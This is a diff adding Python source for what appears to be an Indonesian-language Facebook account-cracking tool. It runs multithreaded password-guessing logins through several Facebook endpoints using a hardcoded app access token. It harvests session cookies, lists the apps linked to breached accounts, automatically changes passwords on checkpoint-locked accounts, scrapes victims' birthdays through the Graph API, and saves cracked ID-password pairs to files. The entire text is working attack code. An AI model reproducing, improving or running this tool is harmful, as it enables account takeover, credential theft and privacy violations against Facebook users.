+    _dapunta_cici_('%s╠══[%s•%s] %sContoh : 321,786,gaming,ganteng'%(O,P,O,P));coy = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Pass Tambahan Dibelakang Nama : '%(O,P,O,P));xy = _dapunta_dapunta_('passangka.txt','w');xy.write(coy);xy.close
+    
+### Logger Crack
+def log_api_1(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    response = r.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + em + '&password=' + pas + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_api_2(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
+    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 'email': em, 'locale': 'en_US', 'password': pas, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
+    api = 'https://b-api.facebook.com/method/auth.login'
+    response = r.get(api, params=param, headers=header)
+    if 'session_key' in response.text and 'EAAA' in response.text:return {"status":"ok","email":em,"pass":pas}
+    elif 'www.facebook.com' in response.json()['error_msg']:return {"status":"cp","email":em,"pass":pas}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_mbasic_1(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get("https://mbasic.facebook.com/")
+    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_mbasic_2(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get("https://mbasic.facebook.com/")
+    b = bs4.BeautifulSoup(p.text,"html.parser")
+    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+    data={}
+    for i in b("input"):
+        if i.get("value") is None:
+            if i.get("name")=="email":data.update({"email":em})
+            elif i.get("name")=="pass":data.update({"pass":pas})
+            else:data.update({i.get("name"):""})
+        else:data.update({i.get("name"):i.get("value")})
+    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
+    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_mobile_1(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get("https://m.facebook.com/")
+    b = r.post("https://m.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in r.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in r.cookies.get_dict().keys():return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
+    else:return {"status":"error","email":em,"pass":pas}
+def log_mobile_2(em,pas):
+    ua = _dapunta_dapunta_('ugent.txt','r').read()
+    r = requests.Session()
+    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+    p = r.get("https://m.facebook.com/")
+    b = bs4.BeautifulSoup(p.text,"html.parser")
+    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
+    data={}
+    for i in b("input"):
+        if i.get("value") is None:
+            if i.get("name")=="email":data.update({"email":em})
+            elif i.get("name")=="pass":data.update({"pass":pas})
+            else:data.update({i.get("name"):""})
+        else:data.update({i.get("name"):i.get("value")})
+    data.update({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
+    r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
+    po = r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
+    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
+    if "c_user" in list(r.cookies.get_dict().keys()):return {"status":"ok","email":em,"pass":pas,"cookies":_raw_cookies_}
+    elif "checkpoint" in list(r.cookies.get_dict().keys()):return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
+    else:return {"status":"error","email":em,"pass":pas}
+
+### Check Opsi
+def cek_opsi(user,pw,format):
+    _req_ses_ = requests.Session()
+    try:cek_dev_opsi          = open('opsi_dev.txt','r').read()
+    except:cek_dev_opsi       = 'null'
+    try:_auto_change_pass_    = open('auto_ganti.txt','r').read()
+    except:_auto_change_pass_ = 'Ya'
+    try:cek_pilih_opsi        = open('muncul_opsi.txt','r').read()
+    except:cek_pilih_opsi     = 'Tidak'
+    _req_ses_.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua_xiaomi});_sop_dev_ = par(_req_ses_.get(host+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser");_linkurl_ = _sop_dev_.find("form",{"method":"post"})
+    for _cici_ in _sop_dev_("input"):data_1.update({_cici_.get("name"):_cici_.get("value")})
+    data_1.update({"email":user,"pass":pw});_url_post_ = _req_ses_.post(host+_linkurl_.get("action"),data=data_1);_response_ = par(_url_post_.text, "html.parser")
+    if "c_user" in _req_ses_.cookies.get_dict():
+        if "Akun Anda Dikunci" in _url_post_.text:pass
+        else:_cookies_ = ''.join(_req_ses_.cookies.get_dict());_result_ok_ = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,user,pw,tahun(user),P);cek_apk(_result_ok_,cvt_cookies(_cookies_))
+    elif "checkpoint" in _req_ses_.cookies.get_dict():
+        _ratya_ = 0;jumlah_opsi  = [];_title_dev_ = re.findall("\<title>(.*?)<\/title>",str(_response_));link_2 = _response_.find("form",{"method":"post"});list_input = ['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
+        for _dapunta_ in _response_("input"):
+            if _dapunta_.get("name") in list_input:data_2.update({_dapunta_.get("name"):_dapunta_.get("value")})
+        _req_act_ = _req_ses_.post(host+link_2.get("action"),data=data_2);_response2_ = par(_req_act_.text,"html.parser");_check_opsi_  = [_salsabila_.text for _salsabila_ in _response2_.find_all("option")]
+        if len(_check_opsi_)==0:
+            if "Lihat detail login yang ditampilkan. Ini Anda?" in _title_dev_:
+                if _auto_change_pass_ == 'Ya':change_pass(user,_req_ses_,_response_,link_2)
+                else:
+                    if cek_pilih_opsi == 'Ya':_dapunta_cici_(format);_dapunta_cici_('   %s• %sAkun One Tap'%(H,P));_dapunta_cici_("")
+                    else:_dapunta_cici_(format);_dapunta_cici_('   %s• %sAkun One Tap'%(H,P))
+            else:pass
+        elif len(_check_opsi_)!=0:
+            if cek_pilih_opsi == 'Ya':
+                for _asu_ in range(len(_check_opsi_)):_ratya_ += 1;jumlah_opsi.append("\n     "+P+str(_asu_+1)+". "+_check_opsi_[_asu_]+" ")
+                jumop = ('%s   Ditemukan %s Opsi : '%(P,str(len(jumlah_opsi))));_dapunta_cici_(format);_dapunta_cici_(jumop+"".join(jumlah_opsi));_dapunta_cici_("")
+            else:_dapunta_cici_(format)
+    else:
+        if 'hasil' in cek_dev_opsi:_dapunta_cici_(format);_dapunta_cici_("%s[%s!%s] %sPassword Telah Diubah"%(M,P,M,P));_dapunta_cici_('')
+        else:_dapunta_cici_(format)
+
+### Ganti Password
+def auto_ganti_pass(_piye_):
+    while True:
+        _gimana_ = _cici_dapunta_('%s╠══[%s•%s] %sGanti Pass Akun One Tap? [y/t] : '%(O,P,O,P))
+        if _gimana_ in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        elif _gimana_ in ['1','01','001','y','Y']:
+            open('auto_ganti.txt','w').write('Ya');_newpass_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Sandi One Tap : '%(O,P,O,P))
+            if len(_newpass_)<6:print('%s╚══[%s!%s] %sSandi Minimal 6 Karakter'%(M,P,M,P));time.sleep(3);menu()
+            else:open('_new_pass_.txt','w').write(_newpass_)
+            if _piye_ == 'Ya':open('muncul_opsi.txt','w').write('Ya')
+            elif _piye_ == 'Tidak':open('muncul_opsi.txt','w').write('Tidak')
+            else:open('muncul_opsi.txt','w').write('Tidak')
+            break
+        elif _gimana_ in ['2','02','002','t','T']:open('auto_ganti.txt','w').write('Tidak');pass
+        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        break
+def change_pass(user,_req_ses_,_response_,link_2):
+    global ok,cp
+    files_ok = "OK/%s.txt"%(tanggal)
+    try:_new_pass_ = open('_new_pass_.txt','r').read()
+    except:_new_pass_ = 'Dapunta99@@@'
+    _password_ = ''.join(_new_pass_);_result_ok_ = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+    for _dapunta_ in _response_("input"):
+        if _dapunta_.get("name") in _button_dev_:data_change_1.update({_dapunta_.get("name"):_dapunta_.get("value")})
+    _ganti_pass_ = _req_ses_.post(host+link_2.get("action"),data=data_change_1).text;_result_pass_ = par(_ganti_pass_,"html.parser");_link_3_ = _result_pass_.find("form",{"method":"post"});_button_dev__2_ = ["submit[Next]","nh","fb_dtsg","jazoest"]
+    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(_ganti_pass_)):
+        for _cici_ in _result_pass_("input"):
+            if _cici_.get("name") in _button_dev__2_:data_change_2.update({_cici_.get("name"):_cici_.get("value")})
+        data_change_2.update({"password_new":_password_});_ses_final_ = _req_ses_.post(host+_link_3_.get("action"),data=data_change_2);_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in _req_ses_.cookies.get_dict().items()]);__cookies__ = cvt_cookies(_cookies_);cek_apk(_result_ok_,__cookies__);ok.append("%s•%s"%(user,_password_));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(user,_password_));cp -= 1;pass
+    else:pass
+
+### Cek Aplikasi
+def cek_apk(h_ok,_dapunta_):
+    apk = [];ses_ = requests.Session()
+    cek_pilih_opsi = open('muncul_opsi.txt','r').read()
+    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active";dat_game = ses_.get(url,cookies={'cookie':_dapunta_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
+    for asu in form_.find_all("h3"):
+        try:celeng = asu.find('span').text;apk.append('\n   • '+celeng)
+        except:pass
+    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive";dat_game = ses_.get(url2,cookies={'cookie':_dapunta_});datagame = par(dat_game.content,'html.parser');form_    = datagame.find('form',method='post')
+    for asu in form_.find_all("h3"):
+        try:celeng = asu.find('span').text;apk.append('\n   • '+celeng)
+        except:pass
+    if cek_pilih_opsi == 'Ya':_dapunta_cici_(h_ok+''.join(apk));_dapunta_cici_('')
+    elif cek_pilih_opsi == 'Tidak':_dapunta_cici_(h_ok+''.join(apk))
+
+### Cek Tahun Pembuatan
+def tahun(fx):
+    if (re.findall("[a-zA-Z]",str(fx))):tahunz=''
+    else:
+        if len(fx)==15:
+            if fx[:10] in ['1000000000']       :tahunz = ' • 2009'
+            elif fx[:9] in ['100000000']       :tahunz = ' • 2009'
+            elif fx[:8] in ['10000000']        :tahunz = ' • 2009'
+            elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = ' • 2009'
+            elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = ' • 2010'
+            elif fx[:6] in ['100001']          :tahunz = ' • 2010/2011'
+            elif fx[:6] in ['100002','100003'] :tahunz = ' • 2011/2012'
+            elif fx[:6] in ['100004']          :tahunz = ' • 2012/2013'
+            elif fx[:6] in ['100005','100006'] :tahunz = ' • 2013/2014'
+            elif fx[:6] in ['100007','100008'] :tahunz = ' • 2014/2015'
+            elif fx[:6] in ['100009']          :tahunz = ' • 2015'
+            elif fx[:5] in ['10001']           :tahunz = ' • 2015/2016'
+            elif fx[:5] in ['10002']           :tahunz = ' • 2016/2017'
+            elif fx[:5] in ['10003']           :tahunz = ' • 2018/2019'
+            elif fx[:5] in ['10004']           :tahunz = ' • 2019/2020'
+            elif fx[:5] in ['10005']           :tahunz = ' • 2020'
+            elif fx[:5] in ['10006','10007','10008']:tahunz = ' • 2021'
+            else:tahunz=''
+        elif len(fx) in [9,10]:tahunz = ' • 2008/2009'
+        elif len(fx)==8:tahunz = ' • 2007/2008'
+        elif len(fx)==7:tahunz = ' • 2006/2007'
+        else:tahunz=''
+    return tahunz
+
+### Convert Cookies
+def cvt_cookies(raw_cookies):
+    o = {}
+    # _raw_cookies_warvest_ = c_user,datr,dnonce,fr,sb,xs
+    # _raw_cookies_aap_     = c_user,fr,sb,xs,datr
+    # _cooked_cookies_      = sb,datr,c_user,xs,fr
+    kiko = raw_cookies.replace(' ','').split(';')
+    for x in kiko:
+        y = x.split('=')[0]
+        z = x.split('=')[1]
+        o.update({y:z})
+    cooked_cookies = ('sb=%s; datr=%s; c_user=%s; xs=%s; fr=%s'%(o['sb'],o['datr'],o['c_user'],o['xs'],o['fr']))
+    #_cookies_ = {'cookie':cooked_cookies}
+    #print(cooked_cookies)
+    return cooked_cookies
+
+### Metode Crack
+def pilih_methode():
+    try:os.remove('metode.txt')
+    except:pass
+    while True:
+        start_method()
+        put = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+        if put in ['',' ','  ']:cok = open('metode.txt','w');cok.write('methode_mbasic_v1');cok.close()
+        elif put in ['1','01','001','a']:cok = open('metode.txt','w');cok.write('methode_api_v1');cok.close()
+        elif put in ['2','02','002','b']:cok = open('metode.txt','w');cok.write('methode_api_v2');cok.close()
+        elif put in ['3','03','003','c']:cok = open('metode.txt','w');cok.write('methode_mbasic_v1');cok.close()
+        elif put in ['4','04','004','d']:cok = open('metode.txt','w');cok.write('methode_mbasic_v2');cok.close()
+        elif put in ['5','05','005','e']:cok = open('metode.txt','w');cok.write('methode_mobile_v1');cok.close()
+        elif put in ['6','06','006','f']:cok = open('metode.txt','w');cok.write('methode_mobile_v2');cok.close()
+        else:cok = open('metode.txt','w');cok.write('methode_mbasic_v1');cok.close()
+        break
+
+### Crack
+class crack:
+    def __init__(self,files):
+        global ok,cp
+        self.ada = ok;self.cp = cp;self.ko = 0
+        self._hayo_mau_recode_ = open('anti_recode.txt','r').read()
+        if len(self._hayo_mau_recode_) == 24:pass
+        else:
+            try:os.remove(files)
+            except:kata_buat_perecode()
+        try:os.remove('opsi_dev.txt')
+        except:pass
+        cik = open('opsi_dev.txt','w');cik.write('null');cik.close()
+        while True:
+            pilih_methode();_dapunta_cici_('%s║'%(O));_dapunta_cici_('%s╠══[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(O,P,O,P))
+            _pilih_sandi_ = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+            if _pilih_sandi_=="":jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+            elif _pilih_sandi_ in ['m','M','2','02','002']:
+                try:
+                    while True:
+                        try:self.apk = files;self.fs = _dapunta_dapunta_(self.apk).read().splitlines();break
+                        except Exception as e:_dapunta_cici_ ("   %s"%(e));continue
+                    self.fl = []
+                    for i in self.fs:
+                        try:self.fl.append({"id":i.split("•")[0]})
+                        except:continue
+                except Exception as e:_dapunta_cici_(("   %s"%e));continue
+                _dapunta_cici_('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P));self.pwlist();break
+            elif _pilih_sandi_ in ['d','D','1','01','001']:
+                try:
+                    while True:
+                        try:self.apk = files;self.fs = _dapunta_dapunta_(self.apk).read().splitlines();break
+                        except Exception as e:_dapunta_cici_ ("   %s"%(e));continue
+                    self.fl = [];start_methodezz();kopi = _cici_dapunta_('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
+                    if kopi in ['']:
+                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        menu()
+                    elif kopi in ['1','01']:
+                        for i in self.fs:
+                            try:self.fl.append({"id":i.split("•")[0],"pw":generate1(i.split("•")[1])})
+                            except:continue
+                    elif kopi in ['2','02']:
+                        for i in self.fs:
+                            try:self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
+                            except:continue
+                    elif kopi in ['3','03']:
+                        for i in self.fs:
+                            try:self.fl.append({"id":i.split("•")[0],"pw":generate3(i.split("•")[1])})
+                            except:continue
+                    elif kopi in ['4','04']:
+                        try:os.remove('pass.txt')
+                        except:pass
+                        try:os.remove('passangka.txt')
+                        except:pass
+                        tambah_pass();tambah_pass_angka()
+                        for i in self.fs:
+                            try:self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
+                            except:continue
+                    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+                    try:os.remove('opsi_cp.txt')
+                    except:pass
+                    _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
+                    if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+                    elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
+                    elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(35).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_();break
+                    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+                except Exception as e:_dapunta_cici_(("   %s"%e))
+    def pwlist(self):
+        self.pw = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
+        if len(self.pw) ==0:self.pwlist()
+        else:
+            for i in self.fl:i.update({"pw":self.pw})
+            try:os.remove('opsi_cp.txt')
+            except:pass
+            _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
+            if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+            elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
+            elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close();started();ThreadPool(30).map(self.start_crack,self.fl);os.remove(self.apk);_cici_cici_()
+            else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+    def start_crack(self,fl):
+        try:
+            metode = open('metode.txt','r').read()
+            for i in fl.get("pw"):
+                if 'methode_api_v1' in metode:log = log_api_1(fl.get("id"),i)
+                elif 'methode_api_v2' in metode:log = log_api_2(fl.get("id"),i)
+                elif 'methode_mbasic_v1' in metode:log = log_mbasic_1(fl.get("id"),i)
+                elif 'methode_mbasic_v2' in metode:log = log_mbasic_2(fl.get("id"),i)
+                elif 'methode_mobile_v1' in metode:log = log_mobile_1(fl.get("id"),i)
+                elif 'methode_mobile_v2' in metode:log = log_mobile_2(fl.get("id"),i)
+                else:log = log_mbasic_1(fl.get("id"),i)
+                if log.get("status")=="cp":
+                    files_cp = "CP/%s.txt"%(tanggal)
+                    if fl.get("id") in files_cp:pass
+                    else:
+                        try:ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _dapunta_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
+                        except:ttll = (''%())
+                        h_cp = "\r%s[%sCP%s] %s • %s%s%s          "%(O,P,O,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
+                        self.cp.append("%s•%s"%(fl.get("id"),i));_dapunta_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(fl.get("id"),i,ttll.replace(' ','')));break
+                elif log.get("status")=="ok":
+                    files_ok = "OK/%s.txt"%(tanggal)
+                    if fl.get("id") in files_ok:pass
+                    else:
+                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
+                        else:_dapunta_cici_("\r%s[%sOK%s] %s • %s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id"))))
+                        self.ada.append("%s•%s"%(fl.get("id"),i));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(fl.get("id"),i));break
+                else:continue
+            self.ko+=1
+            _dapunta_cici_("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
+        except:self.start_crack(fl)
+
+def set_pass_dev(_file_):
+    global _user_id_dev_
+    try:
+        pilih_methode()
+        _dapunta_cici_('%s║'%(O))
+        _dapunta_cici_('%s╠══[%s•%s] %sContoh : 123456,123456789,123123'%(O,P,O,P))
+        _pasword_ = _cici_dapunta_('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
+        if len(_pasword_)==0:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        _dapunta_cici_('%s║'%(O));puf = _cici_dapunta_('%s╠══[%s•%s] %sMunculkan Opsi CP? [y/t] : '%(O,P,O,P))
+        if puf in ['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        elif puf in ['1','01','001','y','Y']:auto_ganti_pass('Ya');cok = open('opsi_cp.txt','w');cok.write('opsi_cp');cok.close()
+        elif puf in ['2','02','002','t','T']:auto_ganti_pass('Tidak');cok = open('opsi_cp.txt','w');cok.write('null');cok.close()
+        else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
+        _user_id_dev_ = open(_file_,'r').read().splitlines()
+        started()
+        for _user_ in _user_id_dev_:
+            ThreadPool(max_workers=30).submit(crack_langsung_dev,_user_,_pasword_)
+    except:pass
+def crack_langsung_dev(_user_id_,_password_):
+    global _putar_
+    try:
+        metode = open('metode.txt','r').read()
+        for _pass_ in _password_:
+            _pass_ = _pass_.lower()
+            if 'methode_api_v1' in metode:log = log_api_1(_user_id_,_pass_)
+            elif 'methode_api_v2' in metode:log = log_api_2(_user_id_,_pass_)
+            elif 'methode_mbasic_v1' in metode:log = log_mbasic_1(_user_id_,_pass_)
+            elif 'methode_mbasic_v2' in metode:log = log_mbasic_2(_user_id_,_pass_)
+            elif 'methode_mobile_v1' in metode:log = log_mobile_1(_user_id_,_pass_)
+            elif 'methode_mobile_v2' in metode:log = log_mobile_2(_user_id_,_pass_)
+            else:log = log_mbasic_1(_user_id_,_pass_)
+            if log.get("status")=="cp":
+                files_cp = "CP/%s.txt"%(tanggal)
+                if _user_id_ in files_cp:pass
+                else:
+                    try:ke = _req_get_("https://graph.facebook.com/" + _user_id_ + "?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name&access_token=" + _dapunta_dapunta_("token.txt","r").read());tt = _js_lo_(ke.text);ttl = tt["birthday"];m,d,y = ttl.split("/");m = bulan_ttl[m];ttll = (' • %s %s %s'%(d,m,y))
+                    except:ttll = (''%())
+                    h_cp = "\r%s[%sCP%s] %s • %s%s%s          "%(O,P,O,_user_id_,_pass_,ttll,tahun(_user_id_));cek_opsi(_user_id_,_pass_,h_cp)
+                    cp.append("%s•%s"%(_user_id_,_pass_));_dapunta_dapunta_(files_cp,"a+").write("%s•%s%s\n"%(_user_id_,_pass_,ttll.replace(' ','')));break
+            elif log.get("status")=="ok":
+                files_ok = "OK/%s.txt"%(tanggal)
+                if _user_id_ in files_ok:pass
+                else:
+                    if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r%s[%sOK%s] %s • %s%s%s          "%(H,P,H,_user_id_,_pass_,tahun(_user_id_),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
+                    else:_dapunta_cici_("\r%s[%sOK%s] %s • %s%s          "%(H,P,H,_user_id_,_pass_,tahun(_user_id_)))
+                    ok.append("%s•%s"%(_user_id_,_pass_));_dapunta_dapunta_(files_ok,"a+").write("%s•%s\n"%(_user_id_,_pass_));break
+            else:continue
+        _putar_ += 1
+        _dapunta_cici_("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,_user_id_,O,P,str(_putar_),len(_user_id_dev_),O,P,len(ok),O,P,len(cp),O,P), end='');sys.stdout.flush()
+    except:pass
+
+### Mendapat Jumlah Teman Target
+def teman_target():
+    it = _cici_dapunta_('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
+    try:token = _dapunta_dapunta_('token.txt','r').read();mm = _req_get_('https://graph.facebook.com/%s?access_token=%s'%(it,token));nn = _js_lo_(mm.text);_dapunta_cici_ ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nn['name']))
+    except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
